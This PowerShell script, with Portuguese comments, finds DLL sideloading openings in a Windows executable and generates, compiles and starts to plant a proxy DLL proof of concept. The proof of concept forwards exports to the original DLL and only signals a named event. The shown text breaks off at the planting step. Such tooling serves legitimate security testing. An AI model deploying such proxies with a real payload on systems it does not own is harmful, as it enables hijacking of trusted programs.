<#
.SYNOPSIS
    Analisa um executável PE para vulnerabilidade de DLL Sideloading.
    Se vulnerável, gera e compila uma DLL proxy PoC e valida o sideloading via evento nomeado (sem spawnar processos).

.PARAMETER ExePath
    Caminho para o executável a ser analisado.

.PARAMETER GeneratePoC
    Se informado, tenta compilar e implantar a DLL maliciosa de PoC.

.PARAMETER RuntimeScan
    Executa o alvo por 3s e captura DLLs carregadas em runtime via modulos do processo.

.PARAMETER InteractiveScan
    Abre o alvo normalmente para que voce interaja. Monitora DLLs em tempo real pelo
    tempo definido em -ScanSeconds (padrao 30s), depois fecha o processo e lista tudo.

.PARAMETER ScanSeconds
    Duracao em segundos do scan interativo (padrao: 30). Usado com -InteractiveScan.

.EXAMPLE
    .\Check-DllSideloading.ps1 -ExePath "C:\app\target.exe"
    .\Check-DllSideloading.ps1 -ExePath "C:\app\target.exe" -RuntimeScan
    .\Check-DllSideloading.ps1 -ExePath "C:\app\target.exe" -InteractiveScan
    .\Check-DllSideloading.ps1 -ExePath "C:\app\target.exe" -InteractiveScan -ScanSeconds 60
    .\Check-DllSideloading.ps1 -ExePath "C:\app\target.exe" -RuntimeScan -GeneratePoC
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory=$true, Position=0)]
    [string]$ExePath,
    [switch]$GeneratePoC,
    [switch]$RuntimeScan,
    [switch]$InteractiveScan,
    [int]$ScanSeconds = 30
)

# ─── Output helpers ──────────────────────────────────────────────────────────
function Write-Banner {
    Write-Host ""
    Write-Host "  ╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
    Write-Host "  ║       DLL Sideloading Analyzer  +  PoC Generator            ║" -ForegroundColor Cyan
    Write-Host "  ╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
    Write-Host ""
}
function Write-Section([string]$t) { Write-Host ""; Write-Host "  ┌─ $t" -ForegroundColor Yellow }
function Write-Ok([string]$m)      { Write-Host "  │  [+] $m" -ForegroundColor Green  }
function Write-Bad([string]$m)     { Write-Host "  │  [-] $m" -ForegroundColor Red    }
function Write-Warn([string]$m)    { Write-Host "  │  [!] $m" -ForegroundColor Yellow }
function Write-Info([string]$m)    { Write-Host "  │      $m" -ForegroundColor Gray   }

Write-Banner

# ─── Validação ───────────────────────────────────────────────────────────────
if (-not (Test-Path $ExePath)) {
    Write-Host "  [ERRO] Arquivo nao encontrado: $ExePath" -ForegroundColor Red; exit 1
}
$ExePath = (Resolve-Path $ExePath).Path
$ExeDir  = Split-Path $ExePath -Parent
$ExeName = Split-Path $ExePath -Leaf
[byte[]]$bytes = [System.IO.File]::ReadAllBytes($ExePath)

# ─── Parse PE ────────────────────────────────────────────────────────────────
$peOff   = [BitConverter]::ToInt32($bytes, 0x3C)
$sig     = [System.Text.Encoding]::ASCII.GetString($bytes, $peOff, 2)
if ($sig -ne "PE") { Write-Host "  [ERRO] Nao e um PE valido." -ForegroundColor Red; exit 1 }

$machine     = [BitConverter]::ToUInt16($bytes, $peOff + 4)
$numSec      = [BitConverter]::ToUInt16($bytes, $peOff + 6)
$optMagic    = [BitConverter]::ToUInt16($bytes, $peOff + 24)
$dllChars    = [BitConverter]::ToUInt16($bytes, $peOff + 24 + 70)
$optHdrSz    = [BitConverter]::ToUInt16($bytes, $peOff + 20)
$secStart    = $peOff + 24 + $optHdrSz
$arch        = if ($optMagic -eq 0x20B) { "PE32+ (x64)" } else { "PE32 (x86)" }
# Data Directories start: PE32 = optHdr+96, PE32+ = optHdr+112
$ddBase      = $peOff + 24 + $(if ($optMagic -eq 0x20B) { 112 } else { 96 })

function ConvertTo-FileOffset([uint32]$rva) {
    for ($i = 0; $i -lt $numSec; $i++) {
        $s   = $secStart + $i * 40
        $va  = [BitConverter]::ToUInt32($bytes, $s + 12)
        $vs  = [BitConverter]::ToUInt32($bytes, $s + 16)
        $raw = [BitConverter]::ToUInt32($bytes, $s + 20)
        if ($rva -ge $va -and $rva -lt ($va + $vs)) { return [int]($raw + $rva - $va) }
    }
    return -1
}

function Read-NullTermString([int]$off) {
    $sb = New-Object System.Text.StringBuilder
    while ($off -lt $bytes.Length -and $bytes[$off] -ne 0) {
        [void]$sb.Append([char]$bytes[$off]); $off++
    }
    return $sb.ToString()
}

# ─── Import Table ─────────────────────────────────────────────────────────────
function Get-ImportDlls {
    $out = [System.Collections.Generic.List[string]]::new()
    $rva = [BitConverter]::ToUInt32($bytes, $ddBase + 8)
    if ($rva -eq 0) { return ,$out }
    $off = ConvertTo-FileOffset $rva
    if ($off -lt 0) { return ,$out }
    $idx = 0
    while ($true) {
        $nameRVA = [BitConverter]::ToUInt32($bytes, $off + $idx*20 + 12)
        if ($nameRVA -eq 0) { break }
        $nameOff = ConvertTo-FileOffset $nameRVA
        if ($nameOff -lt 0) { break }
        $out.Add((Read-NullTermString $nameOff))
        $idx++
    }
    return ,$out
}

# ─── Delay Import Table ────────────────────────────────────────────────────────
function Get-DelayImportDlls {
    $out = [System.Collections.Generic.List[string]]::new()
    $rva = [BitConverter]::ToUInt32($bytes, $ddBase + 13*8)
    if ($rva -eq 0) { return ,$out }
    $off = ConvertTo-FileOffset $rva
    if ($off -lt 0) { return ,$out }
    $idx = 0
    while ($true) {
        $nameRVA = [BitConverter]::ToUInt32($bytes, $off + $idx*32 + 4)
        if ($nameRVA -eq 0) { break }
        $nameOff = ConvertTo-FileOffset $nameRVA
        if ($nameOff -lt 0) { break }
        $out.Add((Read-NullTermString $nameOff))
        $idx++
    }
    return ,$out
}

# ─── KnownDLLs (carregados sempre do System32, nunca do app dir) ──────────────
function Get-KnownDlls {
    $known = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)
    try {
        $props = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs" -EA Stop
        foreach ($p in $props.PSObject.Properties) {
            if ($p.Name -like 'PS*') { continue }
            if ($p.Value -is [string] -and $p.Value -ne '') { [void]$known.Add($p.Value) }
        }
    } catch {}
    return $known
}

# ─── Manifest ────────────────────────────────────────────────────────────────
function Get-EmbeddedManifest {
    $rsrcRVA  = [BitConverter]::ToUInt32($bytes, $ddBase + 2*8)
    $rsrcSize = [BitConverter]::ToUInt32($bytes, $ddBase + 2*8 + 4)
    if ($rsrcRVA -eq 0) { return $null }
    $rsrcOff = ConvertTo-FileOffset $rsrcRVA
    $end     = [Math]::Min($rsrcOff + [int]$rsrcSize, $bytes.Length - 5)
    for ($i = $rsrcOff; $i -lt $end; $i++) {
        if ($bytes[$i] -eq 0x3C -and $bytes[$i+1] -eq 0x3F) {
            $xml = [System.Text.Encoding]::UTF8.GetString($bytes, $i, [Math]::Min(800, $bytes.Length - $i))
            if ($xml.StartsWith("<?xml")) { return $xml }
        }
    }
    return $null
}

# ─── Embedded MZ count ────────────────────────────────────────────────────────
function Get-EmbeddedMzCount {
    $count = 0
    for ($i = 1; $i -lt ($bytes.Length - 1); $i++) {
        if ($bytes[$i] -eq 0x4D -and $bytes[$i+1] -eq 0x5A) { $count++ }
    }
    return $count
}

# ─── P/Invoke EnumProcessModulesEx (LIST_MODULES_ALL: 32+64 bit) ────────────
if (-not ([System.Management.Automation.PSTypeName]'NativeModEnum').Type) {
    Add-Type -TypeDefinition @'
using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Collections.Generic;
public class NativeModEnum {
    const int PROCESS_QUERY_INFORMATION = 0x0400;
    const int PROCESS_VM_READ           = 0x0010;
    const int LIST_MODULES_ALL          = 0x03;
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr OpenProcess(int access, bool inherit, int pid);
    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr h);
    [DllImport("psapi.dll", SetLastError=true)]
    static extern bool EnumProcessModulesEx(IntPtr hProc, IntPtr[] mods, int cb, out int needed, int filter);
    [DllImport("psapi.dll", CharSet=CharSet.Unicode)]
    static extern int GetModuleFileNameEx(IntPtr hProc, IntPtr hMod, StringBuilder buf, int sz);
    public static string[] GetModuleNames(int pid) {
        IntPtr h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, pid);
        if (h == IntPtr.Zero) return new string[0];
        try {
            int needed = 0;
            EnumProcessModulesEx(h, null, 0, out needed, LIST_MODULES_ALL);
            if (needed == 0) return new string[0];
            IntPtr[] arr = new IntPtr[needed / IntPtr.Size];
            if (!EnumProcessModulesEx(h, arr, needed, out needed, LIST_MODULES_ALL))
                return new string[0];
            int count = needed / IntPtr.Size;
            var names = new List<string>(count);
            var sb = new StringBuilder(512);
            for (int i = 0; i < count; i++) {
                sb.Length = 0;
                if (GetModuleFileNameEx(h, arr[i], sb, 512) > 0)
                    names.Add(System.IO.Path.GetFileName(sb.ToString()));
            }
            return names.ToArray();
        } finally { CloseHandle(h); }
    }
}
'@
}

# ─── Runtime DLL Monitor ────────────────────────────────────────────────
function Get-RuntimeLoadedDlls {
    param([string]$exePath, [int]$waitMs = 3000)
    $result = [System.Collections.Generic.HashSet[string]]::new(
        [System.StringComparer]::OrdinalIgnoreCase)
    try {
        $proc = Start-Process -FilePath $exePath -PassThru -WindowStyle Minimized -EA Stop
        if (-not $proc) { return ,$result }
        $sw = [System.Diagnostics.Stopwatch]::StartNew()
        while ($sw.ElapsedMilliseconds -lt $waitMs) {
            try {
                foreach ($n in [NativeModEnum]::GetModuleNames($proc.Id)) {
                    [void]$result.Add($n)
                }
            } catch {}
            if ($proc.HasExited) { break }
            Start-Sleep -Milliseconds 300
        }
        if (-not $proc.HasExited) { $proc.Kill(); [void]$proc.WaitForExit(2000) }
    } catch {}
    return ,$result
}

function Get-InteractiveRuntimeDlls {
    param([string]$exePath, [int]$seconds = 30)
    $result = [System.Collections.Generic.HashSet[string]]::new(
        [System.StringComparer]::OrdinalIgnoreCase)
    try {
        $proc = Start-Process -FilePath $exePath -PassThru -EA Stop
        if (-not $proc) { return ,$result }
        $totalMs = $seconds * 1000
        $sw = [System.Diagnostics.Stopwatch]::StartNew()
        while ($sw.ElapsedMilliseconds -lt $totalMs) {
            $remaining = [int](($totalMs - $sw.ElapsedMilliseconds) / 1000) + 1
            $newDlls = [System.Collections.Generic.List[string]]::new()
            try {
                foreach ($n in [NativeModEnum]::GetModuleNames($proc.Id)) {
                    if ($result.Add($n)) { $newDlls.Add($n) }
                }
            } catch {}
            if ($newDlls.Count -gt 0) {
                Write-Host ""
                foreach ($d in $newDlls) {
                    Write-Host ("  [+] $d") -ForegroundColor Green
                }
                Write-Host ("  [{0,3}s] {1,3} DLL(s) capturadas" -f $remaining, $result.Count) `
                    -NoNewline -ForegroundColor DarkCyan
            } else {
                Write-Host ("`r  [{0,3}s] {1,3} DLL(s) capturadas" -f $remaining, $result.Count) `
                    -NoNewline -ForegroundColor DarkCyan
            }
            if ($proc.HasExited) {
                Write-Host "`n  [!] Processo encerrado pelo usuario." -ForegroundColor Yellow
                return ,$result
            }
            Start-Sleep -Milliseconds 500
        }
        Write-Host ""
        if (-not $proc.HasExited) { $proc.Kill(); [void]$proc.WaitForExit(2000) }
    } catch { Write-Host "" }
    return ,$result
}

# ─── Coleta ──────────────────────────────────────────────────────────────────
Write-Host "  Analisando PE..." -ForegroundColor DarkGray

[System.Collections.Generic.List[string]]$staticDlls = Get-ImportDlls
[System.Collections.Generic.List[string]]$delayDlls  = Get-DelayImportDlls
$knownDlls   = Get-KnownDlls
$manifest    = Get-EmbeddedManifest
$mzCount     = Get-EmbeddedMzCount

# Runtime scan: executa alvo e captura modulos carregados
$runtimeDlls = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)
if ($RuntimeScan) {
    Write-Host "  Executando alvo por 3s para capturar DLLs runtime..." -ForegroundColor DarkGray
    $runtimeDlls = Get-RuntimeLoadedDlls $ExePath 3000
    Write-Host "  $($runtimeDlls.Count) modulos capturados em runtime." -ForegroundColor DarkGray
}

if ($InteractiveScan) {
    Write-Host ""
    Write-Host "  ╭─ SCAN INTERATIVO ────────────────────────────────────────────────" -ForegroundColor Cyan
    Write-Host "  │  Abrindo '$ExeName' -- interaja normalmente com o programa." -ForegroundColor Cyan
    Write-Host "  │  Sera fechado automaticamente em $ScanSeconds segundo(s)." -ForegroundColor Cyan
    Write-Host "  │  Dica: navegue menus, abra dialogs, use funcoes para capturar mais DLLs." -ForegroundColor DarkCyan
    Write-Host "  ╰────────────────────────────────────────────────────────────────" -ForegroundColor Cyan
    Write-Host ""
    $interDlls = Get-InteractiveRuntimeDlls $ExePath $ScanSeconds
    foreach ($d in $interDlls) { [void]$runtimeDlls.Add($d) }
    Write-Host "  Scan encerrado: $($runtimeDlls.Count) DLL(s) unicas acumuladas." -ForegroundColor Green
}

# Junta todos os DLLs sem duplicatas (ordem: delay > static > runtime-only)
$allDllsSet  = [System.Collections.Generic.LinkedList[string]]::new()
$allDllsSeen = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)

foreach ($d in $delayDlls)  { if ($allDllsSeen.Add($d)) { [void]$allDllsSet.AddLast($d) } }
foreach ($d in $staticDlls) { if ($allDllsSeen.Add($d)) { [void]$allDllsSet.AddLast($d) } }
foreach ($d in $runtimeDlls) {
    if ($d -ne [System.IO.Path]::GetFileName($ExePath) -and $allDllsSeen.Add($d)) {
        [void]$allDllsSet.AddLast($d)
    }
}

# Classifica vulneráveis
$highRisk = [System.Collections.Generic.HashSet[string]]::new(
    [string[]]@('VERSION.dll','MSIMG32.dll','NETAPI32.dll','WININET.dll',
                'PSAPI.DLL','IPHLPAPI.DLL','WINTRUST.dll','credui.dll',
                'WTSAPI32.dll','COMCTL32.dll','WSOCK32.dll','USERENV.dll',
                'CRYPT32.dll','imagehlp.dll'),
    [System.StringComparer]::OrdinalIgnoreCase)

$vulnList = [System.Collections.Generic.List[PSCustomObject]]::new()

foreach ($dll in $allDllsSet) {
    if (-not $knownDlls.Contains($dll)) {
        $type = if   ($delayDlls.Contains($dll))   { "Delay" }
                elseif ($runtimeDlls.Contains($dll) -and
                        -not $staticDlls.Contains($dll) -and
                        -not $delayDlls.Contains($dll)) { "Runtime" }
                else { "Static" }
        $risk = if ($highRisk.Contains($dll)) { "ALTO" } else { "MÉDIO" }
        $vulnList.Add([PSCustomObject]@{ Name=$dll; Type=$type; Risk=$risk })
    }
}

# Ordena: ALTO primeiro; dentro do risco: Delay > Runtime > Static
$typeOrd = @{ "Delay"=0; "Runtime"=1; "Static"=2 }
$vulnSorted = @($vulnList | Sort-Object { if ($_.Risk -eq "ALTO") { 0 } else { 1 } }, { $typeOrd[$_.Type] })

# Proteções
$hasAslr   = ($dllChars -band 0x0040) -ne 0
$hasDep    = ($dllChars -band 0x0100) -ne 0
$hasCfg    = ($dllChars -band 0x4000) -ne 0
$hasNoSeh  = ($dllChars -band 0x0400) -ne 0
$hasGs     = $false
$hasSafeSeh= $false
$lcRVA     = [BitConverter]::ToUInt32($bytes, $ddBase + 10*8)
if ($lcRVA -ne 0) {
    $lcOff = ConvertTo-FileOffset $lcRVA
    if ($lcOff -ge 0) {
        $hasGs      = [BitConverter]::ToUInt32($bytes, $lcOff + 60) -ne 0
        $hasSafeSeh = [BitConverter]::ToUInt32($bytes, $lcOff + 64) -ne 0
    }
}

$privLevel = "desconhecido"
if ($manifest -match "requestedExecutionLevel level='([^']+)'") { $privLevel = $Matches[1] }

$sigInfo = try {
    $s = Get-AuthenticodeSignature $ExePath -EA Stop
    @{ Status=$s.Status.ToString(); Signer=$s.SignerCertificate.Subject }
} catch { @{ Status="Erro"; Signer="" } }

# ─── RELATÓRIO ───────────────────────────────────────────────────────────────
Write-Section "ALVO"
Write-Info "Arquivo      : $ExeName"
Write-Info "Tamanho      : $([math]::Round($bytes.Length/1KB,1)) KB"
Write-Info "Arquitetura  : $arch"
Write-Info "Privilégio   : $privLevel"
Write-Info "Assinatura   : $($sigInfo.Status)"
if ($sigInfo.Signer) { Write-Info "Signatário   : $($sigInfo.Signer)" }
Write-Info "EXEs embutidos (self-extract): $($mzCount - 1)"

Write-Section "PROTEÇÕES BINÁRIAS"
if ($hasAslr)    { Write-Ok "ASLR (DYNAMIC_BASE)" }    else { Write-Bad "ASLR desabilitado" }
if ($hasDep)     { Write-Ok "DEP (NX_COMPAT)" }         else { Write-Bad "DEP desabilitado"  }
if ($hasGs)      { Write-Ok "Stack Cookie (/GS)" }      else { Write-Bad "Stack Cookie ausente" }
if ($hasSafeSeh) { Write-Ok "SafeSEH" }                 else { Write-Bad "SafeSEH ausente" }
if ($hasCfg)     { Write-Ok "Control Flow Guard (CFG)" } else { Write-Bad "CFG ausente" }

Write-Section "DLLs IMPORTADAS"
Write-Info "Import estático : $($staticDlls.Count) DLL(s)"
Write-Info "Delay Import    : $($delayDlls.Count) DLL(s)  [carregadas via LoadLibrary() em runtime]"
if ($RuntimeScan -or $InteractiveScan) {
    $rtOnly = @($runtimeDlls | Where-Object {
        -not $staticDlls.Contains($_) -and -not $delayDlls.Contains($_) }).Count
    $scanLabel = if ($RuntimeScan -and $InteractiveScan) { "Runtime+Interativo" }
                 elseif ($InteractiveScan) { "Interativo($ScanSeconds" + "s)" }
                 else { "Runtime (proc)" }
    Write-Info "$($scanLabel.PadRight(16)): $($runtimeDlls.Count) DLL(s) capturadas  [$rtOnly exclusivamente runtime]"
}

Write-Section "ANÁLISE — DLL SIDELOADING"
Write-Info "Ordem de busca padrão do Windows:"
Write-Info "  1. Diretório do .exe  ← ponto de ataque"
Write-Info "  2. KnownDLLs (System32 — protegido)"
Write-Info "  3. System32 / Windows"
Write-Info "  4. CWD / PATH"
Write-Host "  │"

if ($vulnSorted.Count -eq 0) {
    Write-Ok "Todas as DLLs estão na lista KnownDLLs. Nenhuma hijackável."
} else {
    Write-Warn "$($vulnSorted.Count) DLL(s) fora de KnownDLLs — hijackáveis via app directory:"
}
if ($vulnSorted.Count -eq 0) { exit 0 }

if (-not $GeneratePoC) {
    Write-Host ""
    Write-Host "  Execute com  -RuntimeScan         para capturar DLLs de inicializacao (3s auto).
  Execute com  -InteractiveScan      para interagir e capturar DLLs em tempo real.
  Adicione     -ScanSeconds N        para definir duracao do scan interativo.
  Execute com  -GeneratePoC          para criar e implantar a DLL proxy de PoC." -ForegroundColor DarkYellow
    exit 0
}

# --- SELETOR INTERATIVO DE DLL ALVO -----------------------------------------------
Write-Host ""
Write-Host "  ╔═══════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "  ║     SELECIONE A DLL INICIAL PARA VALIDACAO AUTOMATICA       ║" -ForegroundColor Cyan
Write-Host "  ╚═══════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""
Write-Host ("  {0,4}  {1,-26} {2,-16} {3,-8} {4}" -f "#","DLL","Tipo","Risco","Nota") -ForegroundColor DarkCyan
Write-Host ("  {0,4}  {1,-26} {2,-16} {3,-8} {4}" -f "────",("─"*24),("─"*14),("─"*6),("─"*20)) -ForegroundColor DarkGray

for ($i = 0; $i -lt $vulnSorted.Count; $i++) {
    $v     = $vulnSorted[$i]
    $tipo  = switch ($v.Type) { "Delay" {"Delay Import"} "Runtime" {"Runtime Load"} default {"Static Import"} }
    $nota  = if ($highRisk.Contains($v.Name)) { "Comumente explorada" } elseif ($v.Type -eq "Runtime") { "Carregada em runtime" } else { "" }
    $color = switch ($v.Type) {
        "Runtime" { if ($v.Risk -eq "ALTO") { "Magenta" } else { "Cyan" } }
        default   { if ($v.Risk -eq "ALTO") { "Red" }     else { "Yellow" } }
    }
    Write-Host ("  {0,4}  {1,-26} {2,-16} {3,-8} {4}" -f ($i+1), $v.Name, $tipo, $v.Risk, $nota) -ForegroundColor $color
}

Write-Host ""
Write-Host "  N   = testa apenas a DLL de numero N" -ForegroundColor DarkYellow
Write-Host "  #N  = testa todas a partir de N ate encontrar uma vulneravel" -ForegroundColor DarkYellow
Write-Host "  Enter = testa apenas a #1" -ForegroundColor DarkYellow
do {
    $raw = Read-Host "  Selecao"
    if ([string]::IsNullOrWhiteSpace($raw)) { $raw = "1" }
    $raw = $raw.Trim()
    $scanAll = $raw.StartsWith("#")
    $numStr  = if ($scanAll) { $raw.Substring(1).Trim() } else { $raw }
    $selIdx  = 0
    $valid   = [int]::TryParse($numStr, [ref]$selIdx) -and $selIdx -ge 1 -and $selIdx -le $vulnSorted.Count
    if (-not $valid) {
        Write-Host "  [!] Entrada invalida. Use um numero (ex: 2) ou #numero (ex: #2)." -ForegroundColor Yellow
    }
} while (-not $valid)

# Monta lista de DLLs a testar
if ($scanAll) {
    # A partir de selIdx ate o fim
    $tryOrder = @($vulnSorted[($selIdx-1)..($vulnSorted.Count-1)])
} else {
    # Apenas a DLL selecionada
    $tryOrder = @($vulnSorted[$selIdx-1])
}

# --- FUNCOES ─────────────────────────────────────────────────────────────────
function Get-DllExportNames([string]$path) {
    $out = [System.Collections.Generic.List[string]]::new()
    if (-not (Test-Path $path)) { return ,$out }
    [byte[]]$b = [System.IO.File]::ReadAllBytes($path)
    $pe2  = [BitConverter]::ToInt32($b, 0x3C)
    $mag2 = [BitConverter]::ToUInt16($b, $pe2 + 24)
    $ns2  = [BitConverter]::ToUInt16($b, $pe2 + 6)
    $opt2 = [BitConverter]::ToUInt16($b, $pe2 + 20)
    $ss2  = $pe2 + 24 + $opt2
    $dd2  = $pe2 + 24 + $(if ($mag2 -eq 0x20B) { 112 } else { 96 })
    function Rva2Off([uint32]$rva) {
        for ($k = 0; $k -lt $ns2; $k++) {
            $s = $ss2 + $k*40
            $va  = [BitConverter]::ToUInt32($b, $s+12)
            $vsz = [BitConverter]::ToUInt32($b, $s+16)
            $raw = [BitConverter]::ToUInt32($b, $s+20)
            if ($rva -ge $va -and $rva -lt ($va+$vsz)) { return [int]($raw+$rva-$va) }
        }; return -1
    }
    $expRVA = [BitConverter]::ToUInt32($b, $dd2)
    if ($expRVA -eq 0) { return ,$out }
    $expOff = Rva2Off $expRVA
    if ($expOff -lt 0) { return ,$out }
    $numNames   = [BitConverter]::ToUInt32($b, $expOff + 24)
    $nameTabRVA = [BitConverter]::ToUInt32($b, $expOff + 32)
    $nameTabOff = Rva2Off $nameTabRVA
    for ($i = 0; $i -lt [int]$numNames; $i++) {
        $nrva = [BitConverter]::ToUInt32($b, $nameTabOff + $i*4)
        $noff = Rva2Off $nrva
        if ($noff -lt 0) { continue }
        $sb = New-Object System.Text.StringBuilder
        $j = $noff
        while ($j -lt $b.Length -and $b[$j] -ne 0) { [void]$sb.Append([char]$b[$j]); $j++ }
        $out.Add($sb.ToString())
    }
    return ,$out
}

function Find-Compiler {
    $vswhere = "${env:ProgramFiles(x86)}\Microsoft Visual Studio\Installer\vswhere.exe"
    if (Test-Path $vswhere) {
        $vsPath = (& $vswhere -latest -products * -property installationPath 2>$null) | Select-Object -First 1
        if ($vsPath) {
            $vcvars = Get-ChildItem "$vsPath\VC\Auxiliary\Build" -Filter "vcvars32.bat" -EA SilentlyContinue | Select-Object -First 1
            $cl     = Get-ChildItem "$vsPath\VC\Tools\MSVC" -Recurse -Filter "cl.exe" -EA SilentlyContinue |
                      Where-Object { $_.FullName -match "Hostx64.x86|Hostx86.x86" } | Select-Object -First 1
            if ($cl -and $vcvars) { return @{ Type="MSVC"; Path=$cl.FullName; Vcvars=$vcvars.FullName } }
        }
    }
    $candidates = @(
        @{ vsbase="${env:ProgramFiles(x86)}\Microsoft Visual Studio\2019"; host="Hostx64\x86" },
        @{ vsbase="${env:ProgramFiles(x86)}\Microsoft Visual Studio\2019"; host="Hostx86\x86" },
        @{ vsbase="${env:ProgramFiles}\Microsoft Visual Studio\2022";       host="Hostx64\x86" }
    )
    foreach ($c in $candidates) {
        if (-not (Test-Path $c.vsbase)) { continue }
        $vcvars = Get-ChildItem $c.vsbase -Recurse -Filter "vcvars32.bat" -EA SilentlyContinue | Select-Object -First 1
        $cl     = Get-ChildItem $c.vsbase -Recurse -Filter "cl.exe" -EA SilentlyContinue |
                  Where-Object { $_.FullName -match ($c.host -replace "\\",".") } | Select-Object -First 1
        if ($cl -and $vcvars) { return @{ Type="MSVC"; Path=$cl.FullName; Vcvars=$vcvars.FullName } }
    }
    foreach ($gcc in @("gcc.exe","i686-w64-mingw32-gcc.exe","x86_64-w64-mingw32-gcc.exe")) {
        $gccCmd = Get-Command $gcc -EA SilentlyContinue
        if ($gccCmd) { return @{ Type="GCC"; Path=$gccCmd.Source; Vcvars=$null } }
    }
    return $null
}

# Valida sideloading via named event (sem spawnar processo -- OPSEC)
function Test-VulnDll {
    param([string]$exePath, [string]$evtName, [int]$waitSec = 6)
    $evt = $null
    try {
        $evt  = [System.Threading.EventWaitHandle]::new(
            $false, [System.Threading.EventResetMode]::ManualReset, $evtName)
        $proc = $null
        try { $proc = Start-Process -FilePath $exePath -PassThru -WindowStyle Minimized -EA Stop } catch { return $false }
        $signaled = $evt.WaitOne($waitSec * 1000)
        if ($proc -and -not $proc.HasExited) { try { $proc.Kill(); [void]$proc.WaitForExit(2000) } catch {} }
        return $signaled
    } finally {
        if ($evt) { $evt.Dispose() }
    }
}

# --- COMPILADOR ───────────────────────────────────────────────────────────────
$compiler = Find-Compiler
if (-not $compiler) {
    Write-Bad "Nenhum compilador encontrado (cl.exe / gcc). Instale MinGW ou Visual Studio."
    exit 0
}
Write-Ok "Compilador : $($compiler.Type)  →  $($compiler.Path)"

# --- TEMPLATE C ───────────────────────────────────────────────────────────────
$cTemplate = @'
#include <windows.h>
/* === EXPORT FORWARDERS (auto-gerados) === */
%%PRAGMAS%%
static volatile LONG g_fired = 0;
/* Sinaliza evento nomeado -- sem spawnar processo (OPSEC) */
static DWORD WINAPI PayloadThread(LPVOID lp) {
    Sleep(300);
    HANDLE h = OpenEventA(EVENT_MODIFY_STATE | SYNCHRONIZE, FALSE, "%%EVTNAME%%");
    if (h) { SetEvent(h); CloseHandle(h); }
    return 0;
}
BOOL WINAPI DllMain(HINSTANCE hInst, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hInst);
        if (InterlockedCompareExchange(&g_fired, 1, 0) == 0) {
            HANDLE ht = CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
            if (ht) CloseHandle(ht);
        }
    }
    return TRUE;
}
'@

# --- LOOP DE VALIDACAO ────────────────────────────────────────────────────────
Write-Section "PoC — VALIDACAO AUTOMATICA"
Write-Host "  Testando $($tryOrder.Count) DLL(s) em sequencia..." -ForegroundColor Cyan
Write-Host ""

$validatedDll = $null
$results      = [System.Collections.Generic.List[PSObject]]::new()
$testNum      = 0

foreach ($candidate in $tryOrder) {
    $testNum++
    $cn        = $candidate.Name
    $cb        = [System.IO.Path]::GetFileNameWithoutExtension($cn)
    $cOrigBase = "_orig_$cb"
    $cOrigDll  = "$cOrigBase.dll"
    $cDllOut   = Join-Path $ExeDir $cn
    $cOrigDst  = Join-Path $ExeDir $cOrigDll
    $cOrigSrc  = $null

    if ($optMagic -eq 0x20B) { $cPaths = @("sysnative","System32","SysWOW64") }
    else                      { $cPaths = @("SysWOW64","System32") }
    foreach ($__d in $cPaths) {
        $__p = [System.IO.Path]::Combine($env:SystemRoot, $__d, $cn)
        if ([System.IO.File]::Exists($__p)) { $cOrigSrc = $__p; break }
    }

    Write-Host ("  [{0,2}/{1}] {2,-28}" -f $testNum, $tryOrder.Count, $cn) -NoNewline -ForegroundColor Cyan

    if (-not $cOrigSrc) {
        Write-Host "original nao encontrada -- pulando." -ForegroundColor DarkGray
        $results.Add([PSCustomObject]@{ Name=$cn; Status="NoOriginal" })
        continue
    }

    # Exports + pragma/def para esta DLL
    [System.Collections.Generic.List[string]]$cExports = Get-DllExportNames $cOrigSrc
    $cPragmas = if ($cExports.Count -gt 0) {
        ($cExports | ForEach-Object { "#pragma comment(linker, `"/export:$_=$cOrigBase.$_`")" }) -join "`n"
    } else { "/* sem exports */" }
    $cDefContent = "LIBRARY $($cb.ToUpper())`r`nEXPORTS"
    if ($cExports.Count -gt 0) {
        $cDefContent += "`r`n" + (($cExports | ForEach-Object { "    $_ = $cOrigBase.$_" }) -join "`r`n")
    }
    $evtName = "PSVuln_" + [System.Guid]::NewGuid().ToString("N")
    $cSource = $cTemplate -replace "%%PRAGMAS%%", $cPragmas -replace "%%EVTNAME%%", $evtName

    # Compila em temp
    $tmpDir  = Join-Path $env:TEMP "dll_poc_$(Get-Random)"
    New-Item -ItemType Directory -Path $tmpDir -Force | Out-Null
    $srcFile = Join-Path $tmpDir "poc.c"
    $defFile = Join-Path $tmpDir "poc.def"
    $dllFile = Join-Path $tmpDir $cn
    Set-Content -Path $srcFile -Value $cSource     -Encoding UTF8
    Set-Content -Path $defFile -Value $cDefContent -Encoding ASCII

    if ($compiler.Type -eq "MSVC") {
        $clCmd   = "cl /nologo /LD /Fe:`"$dllFile`" /Fo:`"$tmpDir\poc.obj`" `"$srcFile`" /link /DLL /MACHINE:X86"
        $batch   = "@echo off`r`ncall `"$($compiler.Vcvars)`" >nul 2>&1`r`n$clCmd`r`n"
        $batFile = Join-Path $tmpDir "build.bat"
        Set-Content -Path $batFile -Value $batch -Encoding ASCII
        $null = cmd /c "`"$batFile`"" 2>&1
    } else {
        $bits = if ($compiler.Path -match "x86_64") { "-m64" } else { "-m32" }
        $null = cmd /c "`"$($compiler.Path)`" $bits -shared -o `"$dllFile`" `"$srcFile`" `"$defFile`" -lkernel32 -Wl,--kill-at" 2>&1
    }

    if (-not (Test-Path $dllFile)) {
        Write-Host "falha na compilacao -- pulando." -ForegroundColor Yellow
        $results.Add([PSCustomObject]@{ Name=$cn; Status="CompileErr" })
        Remove-Item $tmpDir -Recurse -Force -EA SilentlyContinue
        continue
    }

    # Implanta proxy + original
